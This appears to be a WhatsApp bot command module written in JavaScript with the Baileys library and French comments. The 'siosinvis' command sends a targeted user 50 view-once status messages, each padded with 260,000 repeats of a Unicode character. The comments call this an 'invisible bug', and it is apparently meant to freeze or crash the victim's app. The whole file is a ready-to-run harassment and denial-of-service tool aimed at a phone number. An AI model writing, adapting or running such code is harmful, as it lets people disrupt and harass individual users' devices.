import { generateWAMessageFromContent } from "@whiskeysockets/baileys";
import channelSender from "./channelSender.js";

// === Fonction interne : construit et envoie le bug invisible ===
async function sios(client, destinatario) {
  const tmsg = await generateWAMessageFromContent(
    destinatario,
    {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "Peace and Love\n",
            description: "\n\n\n" + "𑪆".repeat(260000), // spam invisible massif
            singleSelectReply: { selectedId: "id" },
            listType: 1,
          },
        },
      },
    },
    {}
  );

  await client.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [destinatario],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: destinatario } }],
          },
        ],
      },
    ],
  });
}

// === Commande principale ===
export const name = "siosinvis";

export async function execute(sock, m, args) {
  try {
    let participant;

    // Si on répond à un message
    if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
      participant = m.message.extendedTextMessage.contextInfo.participant;
    }
    // Si on donne un numéro
    else if (args.length > 0) {
      participant = args[0].replace("@", "") + "@s.whatsapp.net";
    }
    // Sinon erreur
    else {
      await sock.sendMessage(
        m.key.remoteJid,
        { text: "⚠️ Mentionne ou donne le numéro de la cible." },
        { quoted: m }
      );
      return;
    }

    // Message d’attente
    await sock.sendMessage(
      m.key.remoteJid,
      { text: "🚀 Envoi du bug invisible en cours..." },
      { quoted: m }
    );

    // Notification via channelSender
    await channelSender(m, sock, "✅ Bug invisible envoyé.", 2);

    // Envoi du bug en boucle
    for (let i = 0; i < 50; i++) { // ⚠️ limité à 50 pour éviter de crasher ton bot
      await sios(sock, participant);
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }

  } catch (error) {
    await sock.sendMessage(
      m.key.remoteJid,
      { text: "❌ Erreur siosinvis : " + error.message },
      { quoted: m }
    );
  }
}